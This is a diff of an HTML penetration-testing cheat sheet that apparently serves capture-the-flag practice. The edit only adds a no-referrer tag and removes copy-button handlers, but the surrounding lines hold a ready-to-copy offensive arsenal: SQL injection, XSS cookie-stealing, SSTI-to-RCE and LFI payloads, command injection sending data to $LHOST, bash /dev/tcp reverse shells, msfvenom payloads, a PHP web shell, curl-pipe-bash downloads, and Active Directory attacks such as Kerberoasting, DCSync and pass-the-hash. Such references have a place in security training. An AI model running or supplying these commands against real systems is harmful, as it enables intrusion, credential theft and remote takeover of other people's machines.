@@ -3,6 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
 <title>NIGHT PULSE X • Stable Navigation — V20 Web Security Edition</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
@@ -1695,7 +1696,7 @@ body{overflow-x:hidden!important}
     <div class="card searchable">
       <div class="card-title">🔍 Nmap — Port Scanning <span class="card-tag tag-info">ESSENTIAL</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><span class="code-desc">Quick → Full → Scripts</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><span class="code-desc">Quick → Full → Scripts</span><button class="copy-btn">Copy</button></div>
         <pre><span class="c-comment"># Fast initial scan</span>
 <span class="c-cmd">nmap</span> <span class="c-flag">-sV -sC -T4</span> <span class="c-var">$IP</span> <span class="c-flag">-oN</span> scan.txt
 
@@ -1720,7 +1721,7 @@ body{overflow-x:hidden!important}
     <div class="card searchable">
       <div class="card-title">🌐 Web Discovery <span class="card-tag tag-info">WEB</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><span class="code-desc">Directories & Subdomains</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><span class="code-desc">Directories & Subdomains</span><button class="copy-btn">Copy</button></div>
         <pre><span class="c-comment"># gobuster directories</span>
 <span class="c-cmd">gobuster dir</span> <span class="c-flag">-u</span> http://<span class="c-var">$IP</span> <span class="c-flag">-w</span> /usr/share/wordlists/dirb/common.txt <span class="c-flag">-x</span> php,html,txt <span class="c-flag">-t</span> 40
 
@@ -1740,7 +1741,7 @@ body{overflow-x:hidden!important}
     <div class="card searchable">
       <div class="card-title">🔎 DNS Enumeration <span class="card-tag tag-info">DNS</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Zone transfer</span>
 <span class="c-cmd">dig axfr</span> <span class="c-var">$DOMAIN</span> @<span class="c-var">$IP</span>
 
@@ -1767,7 +1768,7 @@ body{overflow-x:hidden!important}
         <span class="pill pill-green">whois</span>
       </div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># theHarvester</span>
 <span class="c-cmd">theHarvester</span> <span class="c-flag">-d</span> <span class="c-var">$DOMAIN</span> <span class="c-flag">-b</span> all <span class="c-flag">-l</span> 500
 
@@ -1796,7 +1797,7 @@ body{overflow-x:hidden!important}
     <div class="card searchable">
       <div class="card-title">📁 SMB Enumeration <span class="card-tag tag-high">PORT 445</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># List shares</span>
 <span class="c-cmd">smbclient</span> <span class="c-flag">-L</span> //<span class="c-var">$IP</span> <span class="c-flag">-N</span>
 <span class="c-cmd">smbmap</span> <span class="c-flag">-H</span> <span class="c-var">$IP</span> <span class="c-flag">-u</span> anonymous
@@ -1818,7 +1819,7 @@ body{overflow-x:hidden!important}
     <div class="card searchable">
       <div class="card-title">📂 NFS / FTP Enumeration <span class="card-tag tag-info">2049/21</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># NFS show exports</span>
 <span class="c-cmd">showmount</span> <span class="c-flag">-e</span> <span class="c-var">$IP</span>
 
@@ -1839,7 +1840,7 @@ body{overflow-x:hidden!important}
     <div class="card searchable">
       <div class="card-title">📡 SNMP Enumeration <span class="card-tag tag-medium">UDP 161</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># snmpwalk</span>
 <span class="c-cmd">snmpwalk</span> <span class="c-flag">-c</span> public <span class="c-flag">-v1</span> <span class="c-var">$IP</span>
 <span class="c-cmd">snmpwalk</span> <span class="c-flag">-c</span> public <span class="c-flag">-v2c</span> <span class="c-var">$IP</span> <span class="c-flag">-On</span>
@@ -1856,7 +1857,7 @@ body{overflow-x:hidden!important}
     <div class="card searchable">
       <div class="card-title">🗂️ LDAP Enumeration <span class="card-tag tag-info">389/636</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Anonymous LDAP query</span>
 <span class="c-cmd">ldapsearch</span> <span class="c-flag">-x</span> <span class="c-flag">-H</span> ldap://<span class="c-var">$IP</span> <span class="c-flag">-b</span> <span class="c-string">"DC=domain,DC=htb"</span>
 
@@ -2110,7 +2111,7 @@ body{overflow-x:hidden!important}
     <div class="card searchable">
       <div class="card-title">💉 Manual SQL Injection <span class="card-tag tag-critical">CRITICAL</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">SQL</span><span class="code-desc">Detection & Extraction</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">SQL</span><span class="code-desc">Detection & Extraction</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment">-- Basic detection</span>
 <span class="c-string">'</span>  --&gt; error?
 <span class="c-string">''</span> --&gt; no error = SQLi likely
@@ -2143,7 +2144,7 @@ body{overflow-x:hidden!important}
     <div class="card searchable">
       <div class="card-title">🤖 sqlmap Automation</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Basic scan</span>
 <span class="c-cmd">sqlmap</span> <span class="c-flag">-u</span> <span class="c-string">"http://$IP/page?id=1"</span> <span class="c-flag">--dbs</span>
 
@@ -2172,7 +2173,7 @@ body{overflow-x:hidden!important}
       <div class="card-title">🔄 Second-Order SQLi <span class="card-tag tag-high">STORED</span></div>
       <p>Payload stored in DB, executed later when retrieved. Classic in profile/registration forms.</p>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">SQL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">SQL</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment">-- Register with malicious username</span>
 <span class="c-string">admin'--</span>
 <span class="c-string">user' UNION SELECT 1,2,3,4,5--</span>
@@ -2187,7 +2188,7 @@ body{overflow-x:hidden!important}
     <div class="card searchable">
       <div class="card-title">📝 MySQL File Write (LOAD_FILE / INTO OUTFILE)</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">SQL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">SQL</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment">-- Read file (requires FILE privilege)</span>
 <span class="c-string">' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--</span>
 
@@ -2218,7 +2219,7 @@ body{overflow-x:hidden!important}
     <div class="card searchable">
       <div class="card-title">🎯 XSS Payloads <span class="card-tag tag-high">COOKIE STEAL</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">JS</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">JS</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment">// Basic detection</span>
 &lt;script&gt;alert(1)&lt;/script&gt;
 &lt;img src=x onerror=alert(1)&gt;
@@ -2301,7 +2302,7 @@ javascript:alert(1)
     <div class="card searchable">
       <div class="card-title">🧪 SSTI Detection & Identification</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment">-- Detection probes (if output = 49, it's vulnerable)</span>
 {{7*7}}           → 49 = Jinja2, Twig
 ${7*7}            → 49 = Freemarker, Velocity
@@ -2320,7 +2321,7 @@ Mako:    ${open('/etc/passwd').read()}</pre>
     <div class="card searchable">
       <div class="card-title">💥 SSTI → RCE Payloads <span class="card-tag tag-critical">CRITICAL</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">SSTI</span><span class="code-desc">By Engine</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">SSTI</span><span class="code-desc">By Engine</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment">-- Jinja2 (Flask/Python)</span>
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
@@ -2361,7 +2362,7 @@ ${os.popen('id').read()}
     <div class="card searchable">
       <div class="card-title">📁 LFI Payloads <span class="card-tag tag-high">FILE READ</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment">-- Basic LFI</span>
 ?file=../../etc/passwd
 ?file=/etc/passwd
@@ -2394,7 +2395,7 @@ curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://$IP/
     <div class="card searchable">
       <div class="card-title">🪟 Windows Path Traversal</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment">-- Windows traversal</span>
 ?file=..\..\windows\system32\drivers\etc\hosts
 ?file=..\..\..\windows\win.ini
@@ -2426,7 +2427,7 @@ C:\Users\Administrator\Desktop\root.txt</pre>
     <div class="card searchable">
       <div class="card-title">💥 Command Injection <span class="card-tag tag-critical">CRITICAL</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment">-- Separators</span>
 cmd; id
 cmd && id
@@ -2453,7 +2454,7 @@ $(curl http://$LHOST:8888/$(id|base64))
     <div class="card searchable">
       <div class="card-title">🔄 Reverse Shell One-liners</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><span class="code-desc">nc -lvnp 4444</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><span class="code-desc">nc -lvnp 4444</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Bash</span>
 bash -i &gt;&amp; /dev/tcp/<span class="c-var">$LHOST</span>/4444 0&gt;&amp;1
 bash -c 'bash -i &gt;& /dev/tcp/<span class="c-var">$LHOST</span>/4444 0>&1'
@@ -2492,7 +2493,7 @@ bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<span class="c-var">$LHOST</s
     <div class="card searchable">
       <div class="card-title">🩸 BloodHound Collection <span class="card-tag tag-critical">MUST DO</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># bloodhound-python</span>
 <span class="c-cmd">bloodhound-python</span> <span class="c-flag">-u</span> user <span class="c-flag">-p</span> pass <span class="c-flag">-d</span> domain.htb <span class="c-flag">-ns</span> <span class="c-var">$IP</span> <span class="c-flag">-c</span> all
 
@@ -2511,7 +2512,7 @@ bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<span class="c-var">$LHOST</s
     <div class="card searchable">
       <div class="card-title">👥 User/Group Enumeration</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Get all users</span>
 <span class="c-cmd">GetADUsers.py</span> <span class="c-flag">-all</span> domain.htb/<span class="c-var">user</span>:<span class="c-var">pass</span> <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span>
 
@@ -2529,7 +2530,7 @@ Get-ADGroupMember "Domain Admins"</pre>
     <div class="card searchable">
       <div class="card-title">🔑 Password Attacks</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Password spray (avoid lockout!)</span>
 <span class="c-cmd">crackmapexec</span> smb <span class="c-var">$IP</span> <span class="c-flag">-u</span> users.txt <span class="c-flag">-p</span> <span class="c-string">'Winter2024!'</span> <span class="c-flag">--continue-on-success</span>
 <span class="c-cmd">kerbrute</span> passwordspray <span class="c-flag">-d</span> domain.htb users.txt <span class="c-string">'Password123!'</span>
@@ -2546,7 +2547,7 @@ Get-ADGroupMember "Domain Admins"</pre>
     <div class="card searchable">
       <div class="card-title">📋 ACL / Permission Analysis</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Find all objects user has rights on</span>
 Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -match "<span class="c-var">USER_SID</span>"}
 
@@ -2576,7 +2577,7 @@ Get-DomainObjectAcl -Identity "<span class="c-var">target</span>" -ResolveGUIDs<
       <div class="card-title">🎟️ Kerberoasting <span class="card-tag tag-critical">CRITICAL</span></div>
       <p>Request TGS for service accounts with SPN → crack offline</p>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># GetUserSPNs.py</span>
 <span class="c-cmd">GetUserSPNs.py</span> domain.htb/<span class="c-var">user</span>:<span class="c-var">pass</span> <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span> <span class="c-flag">-request</span> <span class="c-flag">-outputfile</span> spns.txt
 
@@ -2592,7 +2593,7 @@ Get-DomainObjectAcl -Identity "<span class="c-var">target</span>" -ResolveGUIDs<
       <div class="card-title">🎭 ASREPRoasting <span class="card-tag tag-high">HIGH</span></div>
       <p>Users with "Do not require Kerberos preauthentication" → get AS-REP hash</p>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># GetNPUsers.py</span>
 <span class="c-cmd">GetNPUsers.py</span> domain.htb/ <span class="c-flag">-usersfile</span> users.txt <span class="c-flag">-format</span> hashcat <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span>
 <span class="c-cmd">GetNPUsers.py</span> domain.htb/<span class="c-var">user</span>:<span class="c-var">pass</span> <span class="c-flag">-request</span> <span class="c-flag">-format</span> hashcat <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span>
@@ -2605,7 +2606,7 @@ Get-DomainObjectAcl -Identity "<span class="c-var">target</span>" -ResolveGUIDs<
     <div class="card searchable">
       <div class="card-title">🎫 Pass-the-Ticket / Silver Ticket</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Export tickets (Windows - Mimikatz)</span>
 sekurlsa::tickets /export
 
@@ -2623,7 +2624,7 @@ sekurlsa::tickets /export
       <div class="card-title">🔄 DCSync Attack</div>
       <p>Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All</p>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># secretsdump</span>
 <span class="c-cmd">secretsdump.py</span> domain.htb/<span class="c-var">user</span>:<span class="c-var">pass</span>@<span class="c-var">$IP</span>
 <span class="c-cmd">secretsdump.py</span> <span class="c-flag">-just-dc-user</span> administrator domain.htb/<span class="c-var">user</span>:<span class="c-var">pass</span>@<span class="c-var">$IP</span>
@@ -2658,7 +2659,7 @@ sekurlsa::tickets /export
       <div class="card-title">🔍 ESC1 — ENROLLEE_SUPPLIES_SUBJECT <span class="card-tag tag-critical">CRITICAL</span></div>
       <p>Template allows requestor to specify any SAN/UPN → request cert as any user including admin.</p>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Find vulnerable templates</span>
 <span class="c-cmd">certipy find</span> <span class="c-flag">-u</span> user@domain.htb <span class="c-flag">-p</span> pass <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span> <span class="c-flag">-stdout</span>
 <span class="c-cmd">certipy find</span> <span class="c-flag">-u</span> user@domain.htb <span class="c-flag">-p</span> pass <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span> <span class="c-flag">-vulnerable</span>
@@ -2675,7 +2676,7 @@ sekurlsa::tickets /export
       <div class="card-title">🌳 Dangling Template (Custom ESC1)</div>
       <p>CA trusts template names that don't exist as AD objects → create the template with ESC1 flags.</p>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">PYTHON</span><span class="code-desc">ldap3 approach</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">PYTHON</span><span class="code-desc">ldap3 approach</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Prerequisites: CreateChild on Templates container</span>
 import ldap3, ssl
 
@@ -2716,7 +2717,7 @@ conn.add(NEW_TEMPLATE_DN, attributes=attrs)</pre>
     <div class="card searchable">
       <div class="card-title">🔐 ESC8 — NTLM Relay to ADCS HTTP</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Setup relay</span>
 <span class="c-cmd">ntlmrelayx.py</span> <span class="c-flag">-t</span> http://<span class="c-var">CA_IP</span>/certsrv/certfnsh.asp <span class="c-flag">-smb2support</span> <span class="c-flag">--adcs</span> <span class="c-flag">--template</span> Machine
 
@@ -2761,7 +2762,7 @@ conn.add(NEW_TEMPLATE_DN, attributes=attrs)</pre>
     <div class="card searchable">
       <div class="card-title">🔑 Pass-the-Hash (PtH) <span class="card-tag tag-critical">CRITICAL</span></div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># psexec</span>
 <span class="c-cmd">psexec.py</span> <span class="c-flag">-hashes</span> <span class="c-var">LM:NT</span> domain/<span class="c-var">user</span>@<span class="c-var">$IP</span>
 
@@ -2782,7 +2783,7 @@ conn.add(NEW_TEMPLATE_DN, attributes=attrs)</pre>
     <div class="card searchable">
       <div class="card-title">🔄 ACL Abuse — ForceChangePassword / GenericAll</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># ForceChangePassword</span>
 <span class="c-cmd">changepasswd.py</span> domain/<span class="c-var">attacker</span>:<span class="c-var">pass</span>@<span class="c-var">$IP</span> <span class="c-flag">-newpass</span> NewPass123! <span class="c-flag">-altuser</span> domain/<span class="c-var">target</span>
 
@@ -2800,7 +2801,7 @@ Set-ADUser <span class="c-var">target</span> <span class="c-flag">-ServicePrinci
     <div class="card searchable">
       <div class="card-title">🎭 DPAPI — Credential Decryption</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Offline decrypt masterkey</span>
 <span class="c-cmd">impacket-dpapi masterkey</span> <span class="c-flag">-file</span> /path/to/masterkey <span class="c-flag">-sid</span> <span class="c-var">S-1-5-21-XXX</span> <span class="c-flag">-password</span> <span class="c-string">'userpass'</span>
 
@@ -2822,7 +2823,7 @@ C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data</pre>
     <div class="card searchable">
       <div class="card-title">🔒 Constrained Delegation Abuse</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Find delegation</span>
 <span class="c-cmd">findDelegation.py</span> domain/<span class="c-var">user</span>:<span class="c-var">pass</span> <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span>
 
@@ -2862,7 +2863,7 @@ C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data</pre>
     <div class="card searchable">
       <div class="card-title">⚡ SUID Abuse (GTFObins)</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Find all SUID</span>
 find / <span class="c-flag">-perm -4000</span> 2>/dev/null
 
@@ -2888,7 +2889,7 @@ echo <span class="c-string">'root2:HASH:0:0::/root:/bin/bash'</span> >> /etc/pas
     <div class="card searchable">
       <div class="card-title">🔧 Sudo Abuse</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># sudo -l shows:</span>
 <span class="c-comment"># (ALL) NOPASSWD: /usr/bin/vim</span>
 sudo vim <span class="c-flag">-c</span> <span class="c-string">':!/bin/bash'</span>
@@ -2911,7 +2912,7 @@ sudo /usr/bin/perl /home/user/backup.pl</pre>
     <div class="card searchable">
       <div class="card-title">⚙️ Capabilities Abuse</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Find capabilities</span>
 getcap <span class="c-flag">-r</span> / 2>/dev/null
 
@@ -2935,7 +2936,7 @@ cap_net_raw   → raw socket access</pre>
     <div class="card searchable">
       <div class="card-title">📋 Automated Enumeration</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># linpeas — download & run</span>
 curl <span class="c-flag">-L</span> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
 
@@ -2954,7 +2955,7 @@ wget http://<span class="c-var">$LHOST</span>:8888/linpeas.sh</pre>
     <div class="card searchable">
       <div class="card-title">🐳 Docker / LXC Escape</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Check if in container</span>
 cat /proc/1/cgroup
 ls /.dockerenv
@@ -3002,7 +3003,7 @@ chroot /mnt/root /bin/bash</pre>
     <div class="card searchable">
       <div class="card-title">🥔 Potato Attacks (SeImpersonatePrivilege)</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Check privileges</span>
 whoami /priv
 
@@ -3024,7 +3025,7 @@ whoami /priv
     <div class="card searchable">
       <div class="card-title">🔍 Automated Windows Enum</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># winPEAS — download</span>
 iwr http://<span class="c-var">$LHOST</span>:8888/winPEASx64.exe -OutFile C:\Temp\wp.exe
 .\wp.exe
@@ -3048,7 +3049,7 @@ net localgroup administrators</pre>
     <div class="card searchable">
       <div class="card-title">🛡️ UAC Bypass</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># fodhelper bypass</span>
 New-Item <span class="c-string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="c-flag">-Force</span>
 Set-ItemProperty <span class="c-string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="c-flag">-Name</span> <span class="c-string">"DelegateExecute"</span> <span class="c-flag">-Value</span> <span class="c-string">""</span>
@@ -3079,7 +3080,7 @@ reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System</pre>
     <div class="card searchable">
       <div class="card-title">🐚 Shell Upgrade (TTY)</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Python pty</span>
 python3 <span class="c-flag">-c</span> <span class="c-string">'import pty;pty.spawn("/bin/bash")'</span>
 python <span class="c-flag">-c</span> <span class="c-string">'import pty;pty.spawn("/bin/bash")'</span>
@@ -3105,7 +3106,7 @@ socat exec:<span class="c-string">'bash -li'</span>,pty,stderr,setsid,sigint,san
     <div class="card searchable">
       <div class="card-title">🌉 SSH Tunneling</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Local port forward (access remote:8080 via localhost:8080)</span>
 ssh <span class="c-flag">-L</span> 8080:localhost:8080 <span class="c-var">user</span>@<span class="c-var">$IP</span>
 
@@ -3127,7 +3128,7 @@ ssh <span class="c-flag">-R</span> 8888:localhost:8888 <span class="c-var">user<
     <div class="card searchable">
       <div class="card-title">🎯 Meterpreter & Metasploit</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">MSFCONSOLE</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">MSFCONSOLE</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Generate payload</span>
 msfvenom <span class="c-flag">-p</span> linux/x64/meterpreter/reverse_tcp LHOST=<span class="c-var">$IP</span> LPORT=4444 <span class="c-flag">-f</span> elf > shell.elf
 msfvenom <span class="c-flag">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="c-var">$IP</span> LPORT=4444 <span class="c-flag">-f</span> exe > shell.exe
@@ -3150,7 +3151,7 @@ run post/multi/recon/local_exploit_suggester</pre>
     <div class="card searchable">
       <div class="card-title">🕸️ Web Shell Arsenal</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">PHP</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">PHP</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment">// Minimal PHP shell</span>
 &lt;?php system($_GET['cmd']); ?&gt;
